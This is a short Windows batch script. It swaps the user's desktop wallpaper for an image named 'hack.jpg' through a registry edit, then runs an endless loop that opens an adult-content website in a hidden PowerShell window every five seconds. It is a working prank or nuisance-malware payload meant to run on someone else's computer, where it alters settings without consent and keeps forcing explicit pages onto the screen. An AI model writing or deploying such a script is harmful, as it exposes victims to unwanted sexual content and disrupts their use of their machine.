@echo off

set "imagePath=%~dp0\hack.jpg"

reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%imagePath%" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters





set "website=https://www.icegay.tv/ru/categories"


:openSite
powershell -windowstyle hidden -command "Start-Process '%website%'"
timeout /nobreak /t 5 >nul 2>&1
goto openSite

